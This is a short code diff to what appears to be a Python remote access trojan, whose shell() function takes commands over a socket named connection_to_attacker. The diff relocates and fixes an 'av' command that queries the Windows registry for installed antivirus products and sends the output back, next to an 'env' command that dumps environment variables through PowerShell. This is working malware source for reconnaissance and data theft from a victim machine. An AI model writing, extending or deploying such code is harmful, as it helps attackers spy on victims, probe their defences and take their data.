@@ -348,7 +348,18 @@ def shell():
                 reliable_send("Program Started")
             except:
                 reliable_send("Failed To Start The Program")
-
+                
+           
+        elif command == 'av':
+            try:
+                execute = subprocess.run(['reg', 'query', 'HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Security Center\\Provider\\Av', '/s'], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
+                                   stdin=subprocess.PIPE)
+                result = execute.stdout + execute.stderr
+                result = result.decode()
+                reliable_send(result)
+            except:
+                pass
+                
         elif command == 'env':
             try:
                 execute = subprocess.run(['powershell', 'Get-Childitem -path env:'], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
@@ -358,18 +369,6 @@ def shell():
                 reliable_send(result)
             except:
                 pass
-
-        elif command == 'av':
-            try:
-                execute = subprocess.run(['reg', 'query', 'HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Security Center\\Provider\\Av', '\s'], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-                reliable_send("done")                   
-                result = execute.stdout + execute.stderr
-                result = result.decode()
-                #print(result)
-                reliable_send(result)
-            except:
-                pass
-
 
         elif command == 'allapps':
             try:
@@ -520,8 +519,6 @@ def shell():
 
 connection_to_attacker = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 connection()
-
-
 """
 key = Fernet.generate_key()
 encryption_type = Fernet(key)
